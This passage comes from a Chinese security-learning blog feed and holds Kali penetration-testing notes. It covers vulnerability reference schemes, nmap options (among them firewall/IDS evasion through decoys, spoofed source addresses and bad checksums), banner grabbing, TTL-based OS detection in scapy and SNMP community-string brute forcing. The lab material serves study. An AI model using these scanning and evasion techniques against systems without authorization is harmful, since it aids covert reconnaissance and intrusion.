id="很多厂商维护自己的Vulnerability-Reference"><a href="#很多厂商维护自己的Vulnerability-Reference" class="headerlink" title="很多厂商维护自己的Vulnerability Reference"></a>很多厂商维护自己的Vulnerability Reference</h3><blockquote><ul><li><p>MS</p><ul><li>微软的漏洞一般都叫MS-xx-xx（年份+漏洞序号）</li><li>例如：MS-08-067</li></ul></li><li><p>MSKB</p><ul><li>微软补丁叫KB</li><li>一个补丁一个KB</li></ul></li></ul></blockquote><h3 id="其他Vulnerability-Reference"><a href="#其他Vulnerability-Reference" class="headerlink" title="其他Vulnerability Reference"></a>其他Vulnerability Reference</h3><blockquote><ul><li>CERT         TA08-297A</li><li>BID            31874</li><li>IAVM         2008-A-0081</li><li>OVAL         OVAL6093</li></ul></blockquote><h3 id="SCAP框架"><a href="#SCAP框架" class="headerlink" title="SCAP框架"></a>SCAP框架</h3><blockquote><ul><li>Security Content Automation Protocol (SCAP)<ul><li>SCAP 是一个集合 了多种安全标准框架</li><li>六个元素：CVE、 OVAL、 CCE、 CPE、 CVSS. XCCDF</li><li>目的是以标准的方法展示和操作安全数据</li><li>由NIST负责维护</li></ul></li><li>SCAP主要解决三个问题<ul><li>实现高层政策法规等到底层实施的落地 （如FISMA,1SO27000系列）</li><li>将信息安全所涉及的各个要素标准化（如统一漏洞的命名及严重性度量）</li><li>将复杂的系统配置核查工作自动化</li></ul></li><li>SCAP是当前美国比较成敦的一套信息安全评估标准体系，其标准化、自动化的恩想对信息安全行业产生了深远的影响。</li></ul></blockquote><h3 id="NVD"><a href="#NVD" class="headerlink" title="NVD"></a>NVD</h3><blockquote><ul><li>NVD (National Vulnerability Database )<ul><li>美困政府的漏洞管理标准数据</li><li>完全基于SCAP框架</li><li>实现自动化漏河管理、安全测量、合规要求</li><li>包含以下库<ul><li>安全检查列表</li><li>软件安全漏洞</li><li>配置锘误</li><li>产品名称</li><li>影响度量</li></ul></li></ul></li><li><a href="https://nvd.nist.gov/">https://nvd.nist.gov/</a></li></ul></blockquote><h2 id="漏洞管理"><a href="#漏洞管理" class="headerlink" title="漏洞管理"></a>漏洞管理</h2><blockquote><ul><li>周期性扫描</li><li>高危漏洞优先处理</li><li>扫描注意事项</li><li>漏洞管理三要素<ul><li>准确性</li><li>时间</li><li>资源</li></ul></li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> 漏洞扫描 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Kali </tag>
            
            <tag> 漏洞扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-nmap专题</title>
      <link href="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/"/>
      <url>/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="目标发现"><a href="#目标发现" class="headerlink" title="目标发现"></a>目标发现</h3><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214210122206.png" alt="image-20221214210122206"><ul><li>-iL     # 从主机或者网络列表中读取数据进行扫描</li><li>-iR     # 随机选择目标进行扫描<ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214211756156.png" alt="image-20221214211756156"></li></ul></li><li>–exclude     # 排除某个或某段地址进行扫描<ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214214804852.png" alt="image-20221214212847507"></li></ul></li></ul></li></ul><h3 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h3><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214212916689.png" alt="image-20221214212916689"><ul><li>-sL    # 列出扫描的目标，相当于子网掩码的计算<ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214213116380.png" alt="image-20221214213116380"></li></ul></li><li>-sn   # 不做端口扫描</li><li>-Pn   # 无论是否有响应包，把所有需要扫描的都扫描一遍，（穿透防火墙的扫描）</li><li>-PS&#x2F;PA&#x2F;PU&#x2F;PY   # SYN，ACK，UDP发现；PY用于SCTP发现，不属于计网络协议</li><li>-PE&#x2F;PP&#x2F;PM   # PE是ICMP echo；PP用于发送时间戳；PM查询子网掩码</li><li>-PO   # IP协议的ping</li><li>-n&#x2F;-R  #  -n不做DNS解析；-R作DNS反向解析</li><li>–dns-servers   # 调用指定DNS服务器扫描</li><li>–system-dns   # 进行操作系统默认的DNS扫描</li><li>–traceroute    #  路由追踪<ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214214637259.png" alt="image-20221214214637259"></li></ul></li></ul></li></ul><h3 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h3><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214214929510.png" alt="image-20221214214929510"><ul><li>-sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM   # SYN半开扫描；TCP全扫描；ACK扫描；窗口扫描；ACK+Fin组合（这几个参数都是不同的flags字段的组合）</li><li>-sU     # UDP扫描<ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214215702606.png" alt="image-20221214215702606"></li></ul></li><li>-sN&#x2F;sF&#x2F;sX    # TCP的flags字段全NULL；只有Fin字段的扫描；Urgent字段的扫描<ul><li>nmap -sN -p80 192.168.216.167<ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214220144928.png" alt="image-20221214220144928"></li></ul></li><li>nmap -sX -p80 192.168.216.167<ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214220350901.png" alt="image-20221214220350901"></li></ul></li></ul></li><li>-sI         # 僵尸扫描</li><li>-sY&#x2F;sZ  # SCTP扫描</li><li>-sO       # IP扫描</li><li>-b         # FTP中继扫描</li></ul></li></ul><h3 id="指定端口扫描"><a href="#指定端口扫描" class="headerlink" title="指定端口扫描"></a>指定端口扫描</h3><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214220656836.png" alt="image-20221214220656836"><ul><li>-p不指定U或者T进行全扫描，也可指定U:53或者T:21进行扫描<ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214221021210.png" alt="image-20221214221021210"></li><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214221203517.png" alt="image-20221214221203517"></li></ul></li><li>–exclude-ports    # 排除某些端口进行扫描</li><li>-F     # 快速扫描；扫描一些少的常用端口</li><li>-r      # 顺序扫描，按照端口顺序进行扫描；否则随机扫描</li><li>–top-ports    # 扫描默认1000个端口的排名靠前的端口<ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214221536652.png" alt="image-20221214221536652"></li></ul></li><li>–port-ratio     # 扫描更常用的端口</li></ul></li></ul><h3 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h3><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214221721266.png" alt="image-20221214221721266"><ul><li>-sV   # 服务扫描，不是所有特征库进行匹配扫描</li><li>–version-intensity      # 强度扫描0-9；从低到高，强度逐渐增加<ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214222110041.png" alt="image-20221214222110041"></li></ul></li><li>–version-light      # 强度为2的扫描</li><li>-version-all           # 强度为9的扫描</li><li>–version-trace     # 显示详细的扫描过程</li></ul></li></ul><h3 id="Script扫描"><a href="#Script扫描" class="headerlink" title="Script扫描"></a>Script扫描</h3><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214222355440.png" alt="image-20221214222355440"><ul><li>–script&#x3D;<Lua script>   # 指定脚本扫描</Lua></li><li>–script-args&#x3D;&lt;n1&#x3D;v1,……&gt;   #  指定脚本参数</li><li>–script-trace             # 显示脚本扫描详细信息</li><li>–script-updatedb    # 更新脚本库</li><li>–script-help&#x3D;<Lua script>    # 查看脚本使用方法</Lua></li></ul></li></ul><h3 id="OS检测"><a href="#OS检测" class="headerlink" title="OS检测"></a>OS检测</h3><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214222933207.png" alt="image-20221214222933207"><ul><li>-O  # OS检测</li><li>–scscan-limit   #  限制OS检测，只检测windows或者只检测linux</li></ul></li></ul><h3 id="时间和性能"><a href="#时间和性能" class="headerlink" title="时间和性能"></a>时间和性能</h3><blockquote><p>进行防止被发现的时间或者性能参数</p></blockquote><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214223112348.png" alt="image-20221214223112348"><ul><li>-T # 设置扫描速度，一般T4足够</li><li>–min-hostgroup&#x2F;max-hostgroup    # 设置一组最小&#x2F;最大扫描多少主机</li><li>–min-parallelism&#x2F;max-parallelism  # 设置并行的最小&#x2F;最大的扫描</li><li>–scan-delay   #  每次探测延迟时间</li><li>–min-rate      #  每秒发包最小是多少</li><li>–max-rate     #  每秒发包最大是多少</li></ul></li></ul><h3 id="FIREWALL-x2F-IDS的躲避或欺骗"><a href="#FIREWALL-x2F-IDS的躲避或欺骗" class="headerlink" title="FIREWALL&#x2F;IDS的躲避或欺骗"></a>FIREWALL&#x2F;IDS的躲避或欺骗</h3><ul><li><p><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214224158974.png" alt="image-20221214224158974"></p><ul><li><p>-f; –mtu       #  设置最大传输单元</p></li><li><p>-D    # 噪声地址隐藏源地址</p><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214224720365.png" alt="image-20221214224720365"></li><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214224737779.png" alt="image-20221214224737779"></li></ul></li><li><p>-S    # 欺骗源地址，使用时需要<code>-e</code>参数指定网卡，再加上<code>-Pn</code>进行扫描</p><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214233340428.png" alt="image-20221214233340428"></li></ul></li><li><p>-e    # 指定网卡</p></li><li><p>-g    # 指定源端口</p><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214230304618.png" alt="image-20221214230304618"></li></ul></li><li><p>–proxies   # 指定代理服务器扫描</p></li><li><p>–data    # 发送包中加入data字段（hex）</p><ul><li><p><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214230647626.png" alt="image-20221214230647626"></p></li><li><p><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214230631299.png" alt="image-20221214230631299"></p></li></ul></li><li><p>–ip-options  # 可选字段，加入特定的IP选项</p></li><li><p>–ttl   # 手动设定TTL值</p></li><li><p>–spoof-mac   # 欺骗MAC地址</p><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214231002201.png" alt="image-20221214231002201"></li><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214231058863.png" alt="image-20221214231058863"></li></ul></li><li><p>–badsum    # 发送错误Checksum字段，用来欺骗防火墙&#x2F;IDS设备</p><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214231310206.png" alt="image-20221214231310206"></li></ul></li></ul></li></ul><h3 id="杂项"><a href="#杂项" class="headerlink" title="杂项"></a>杂项</h3><ul><li><img src="/2022/12/14/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-nmap%E4%B8%93%E9%A2%98/image-20221214231351126.png" alt="image-20221214231351126"><ul><li>-6   # 扫描IPv6</li><li>-A   #  OS检测，version检测，script扫描和路由追踪组合</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 信息搜集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息搜集 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Kali渗透测试-主动信息搜集【服务扫描】</title>
      <link href="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/"/>
      <url>/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><h2 id="服务扫描"><a href="#服务扫描" class="headerlink" title="服务扫描"></a>服务扫描</h2><blockquote><ul><li>识别开放端口上运行的应用</li><li>识别目标操作系统</li><li>提高攻击效率<ul><li>Banner捕获<ul><li>最简单，最不可靠，Banner信息可被管理员修改或删除，迷惑扫描者</li></ul></li><li>服务识别</li><li>操作系统识别</li><li>SNMP分析<ul><li>简单网络管理协议</li><li>Community strings</li><li>信息查询或重新配置</li></ul></li><li>防火墙识别</li></ul></li></ul></blockquote><h3 id="Banner信息"><a href="#Banner信息" class="headerlink" title="Banner信息"></a>Banner信息</h3><blockquote><ul><li><p>软件开发商</p></li><li><p>软件名称</p></li><li><p>服务类型</p></li><li><p>版本号</p><ul><li>直接发现已知的漏洞和软点</li></ul></li><li><p>连接建立后直接获取banner信息</p><ul><li>Apache，Tomcat，版本号等</li></ul></li><li><p>另类服务识别方法</p><ul><li>特征行为和响应字段</li><li>不同的响应可用于识别底层操作系统</li></ul></li></ul></blockquote><h4 id="Nc"><a href="#Nc" class="headerlink" title="Nc"></a>Nc</h4><ul><li><p>nc -nv 1.1.1.1 25</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213102241763.png" alt="image-20221213102241763"></p></li><li><blockquote><p>通过连接目标机的22端口，可以发现使用的OpenSSH软件包，Debian-ubuntu下的操作系统</p></blockquote></li></ul></li><li><p>nc -nv 1.1.1.1 80</p><ul><li><p>通过使用<code>get</code>来获取80端口banner信息</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213102953362.png" alt="image-20221213102953362"></p></li><li><blockquote><p>得到帐号密码，后续可以猜解其他密码</p></blockquote></li></ul></li></ul></li></ul><h4 id="Python"><a href="#Python" class="headerlink" title="Python"></a>Python</h4><ul><li><p>Python socket</p><ul><li><p>Socket模块用于连接网络服务</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213103954814.png" alt="image-20221213103954814"></p></li><li><blockquote><p>首先导入socket库，定义一个banner变量，用于TCP的连接，socket.AF_INET : IPv4 ; socket.SOCK_STREAM : 流式socket , for TCP，connect()方法用于连接目标主机，recv()方法接收4096B的数据，得到banner信息<code>vsftpd：版本2.3.4</code></p></blockquote></li><li><p><code>import socket</code><br><code>banner = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</code><br><code>banner.connect((&quot;192.168.216.167&quot;,21))</code><br><code>banner.recv(4096)</code><br><code>banner.close()</code><br><code>exit()</code></p></li></ul></li><li><p>有些Banner信息不允许抓取，recv()函数无返回将挂起</p></li></ul></li></ul><h4 id="Dmitry"><a href="#Dmitry" class="headerlink" title="Dmitry"></a>Dmitry</h4><ul><li>dmitry -pb 1.1.1.1<ul><li><p><code>-p</code>进行TCP扫描，<code>-b</code>进行端口banner信息的扫描</p><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213111622576.png" alt="image-20221213111622576"></p></li></ul></li></ul><h4 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h4><ul><li>nmap -sT 1.1.1.1 -p1-100 –script&#x3D;banner<ul><li><p>nmap是通过脚本来获取banner信息；banner信息只能通过完整连接的方式进行获取，使用参数<code>-sT</code>，nmap脚本使用的语言是<code>lua</code></p><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213112050994.png" alt="image-20221213112050994"></p></li></ul></li></ul><h4 id="Amap"><a href="#Amap" class="headerlink" title="Amap"></a>Amap</h4><blockquote><p>amap专门用来发现开放端口后面跑什么服务信息，其中<code>-B</code>参数专门用来发现端口上的banner信息</p></blockquote><ul><li>amap -B 1.1.1.1 1-100<ul><li><p>可指定端范围也可单个端口扫描</p><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213112830630.png" alt="image-20221213112830630"></p></li></ul></li></ul><h3 id="服务识别"><a href="#服务识别" class="headerlink" title="服务识别"></a>服务识别</h3><blockquote><ul><li>Banner信息抓取能力有限</li><li>namp响应特征分析识别服务<ul><li>发送系列复杂的探测</li><li>依据响应特征signature</li></ul></li><li>nc -nv 1.1.1.1 80</li><li>nmap 1.1.1.1 -p 80 -sV</li></ul></blockquote><h4 id="Nmap-1"><a href="#Nmap-1" class="headerlink" title="Nmap"></a>Nmap</h4><ul><li><p>nmap通过特征来识别目标端口跑的到底是什么服务</p><ul><li><p>nmap 192.168.216.167 -p1-100 -sV  </p></li><li><blockquote><p><code>-sV</code> 用来识别端口后面跑具体是什么服务，不单单会扫描到banner信息</p></blockquote><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213113615583.png" alt="image-20221213113615583"></p><ul><li><blockquote><p>53端口之前的工具都没有识别到具体的banner信息，通过<code>nmap -sV</code>扫描出是domain服务，并且http服务是由Apache和Ubuntu搭建，此时扫描的结果准确度和真实性要比banner信息高</p></blockquote></li></ul></li></ul></li></ul><h4 id="Amap-1"><a href="#Amap-1" class="headerlink" title="Amap"></a>Amap</h4><blockquote><p>基于特征信息的扫描</p></blockquote><ul><li><p>amap 192.168.216.167 1-100 </p><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213114233417.png" alt="image-20221213114233417"></p><ul><li><p>扫描结果很乱，加参数<code>-q</code>，发现协议信息</p></li><li><p>amap 192.168.216.167 1-100  -q</p><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213114501535.png" alt="image-20221213114501535"></p></li><li><p>amap 192.168.216.167 1-100  -qb   # <code>-b</code>参数打印banner信息</p><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213114732992.png" alt="image-20221213114732992"></p><ul><li><blockquote><p>amap相比于nmap，扫描的结果还是基于banner信息，具体信息不够全面</p></blockquote></li></ul></li></ul></li></ul><h2 id="操作系统识别"><a href="#操作系统识别" class="headerlink" title="操作系统识别"></a>操作系统识别</h2><blockquote><ul><li>TTL起始值<ul><li>Windows：128（65—128）</li><li>Linux&#x2F;Unix：64（1—64）</li><li>某些Unix：255</li></ul></li></ul><p>通过TTL值判断操作系统类型；</p><p>TTL值可被修改，迷惑扫描者。</p></blockquote><h4 id="Python-1"><a href="#Python-1" class="headerlink" title="Python"></a>Python</h4><ul><li><p>使用脚本利用TTL值判断操作系统</p><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213171702249.png" alt="image-20221213171702249"></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/python</span><span class="token keyword">from</span> scapy<span class="token punctuation">.</span><span class="token builtin">all</span> <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">import</span> logginglogging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span> <span class="token string">"scapy.runtime"</span> <span class="token punctuation">)</span><span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>ERROR<span class="token punctuation">)</span><span class="token keyword">import</span> sys<span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span> sys<span class="token punctuation">.</span>argv <span class="token punctuation">)</span> <span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">:</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Usage - ./ttl_os.py [IP adress]"</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Example - ./ttl_os.py 1.1.1.1"</span><span class="token punctuation">)</span>   <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Example will preform ttl analysis to attemptto determine whether the systems is Windows or Linux/Unix"</span><span class="token punctuation">)</span>   sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token punctuation">)</span>ip <span class="token operator">=</span> sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>ans <span class="token operator">=</span> sr1<span class="token punctuation">(</span>IP<span class="token punctuation">(</span>dst<span class="token operator">=</span><span class="token builtin">str</span><span class="token punctuation">(</span>ip<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">/</span>ICMP<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>verbose<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token keyword">if</span> ans <span class="token operator">==</span> <span class="token boolean">None</span><span class="token punctuation">:</span>       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"No response was returned"</span><span class="token punctuation">)</span><span class="token keyword">elif</span> <span class="token builtin">int</span><span class="token punctuation">(</span>ans<span class="token punctuation">[</span>IP<span class="token punctuation">]</span><span class="token punctuation">.</span>ttl<span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">64</span><span class="token punctuation">:</span>       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Host is Linux/Unix"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>       <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"Host is Windows"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><h4 id="Nmap-2"><a href="#Nmap-2" class="headerlink" title="Nmap"></a>Nmap</h4><blockquote><p>基于多种方式进行判断目标操作系统</p></blockquote><ul><li><p>nmap -O 192.168.216.167</p><ul><li><p><code>-O</code>参数专门用于检测操作系统</p><ul><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213172243729.png" alt="image-20221213172243729"></p></li><li><p><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213172259290.png" alt="image-20221213172259290"></p></li><li><blockquote><p>检测出Linux版本是在2.6.9-2.6.33之间，之后可以去查找这个版本之间存在的漏洞</p><p>CPE：每种设备都会进行CPE编号</p></blockquote></li></ul></li></ul></li></ul><h4 id="p0f"><a href="#p0f" class="headerlink" title="p0f"></a>p0f</h4><blockquote><ul><li><p>基于被动式的操作系统识别</p></li><li><p>结合ARP地址欺骗识别全网OS</p></li></ul></blockquote><ul><li>p0f<ul><li><img src="/2022/12/13/Kali%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95-%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86%E3%80%90%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F%E3%80%91/image-20221213174516629.png" alt="image-20221213174516629"></li></ul></li></ul><h2 id="SNMP扫描"><a href="#SNMP扫描" class="headerlink" title="SNMP扫描"></a>SNMP扫描</h2><blockquote><ul><li>snmp<ul><li>信息的金矿<ul><li>可以查看到设备非常详细的内容</li></ul></li><li>经常被错误配置</li><li>public&#x2F;private&#x2F;manager<ul><li>community：登录证书，容易被管理员遗忘修改其特征字符</li><li>可用字典爆破</li></ul></li></ul></li><li>MIB Tree<ul><li>SNMP Managerment Information Base（MIB）<ul><li>有些厂商有自己的MIB库</li></ul></li><li>树形的网络设备管理功能数据库</li><li>1.3.6.1.4.1.77.1.2.25</li></ul></li><li>onesixtyone 1.1.1.1 public</li><li>onesixtyone -c dict.txt -i hosts -o my.log -w 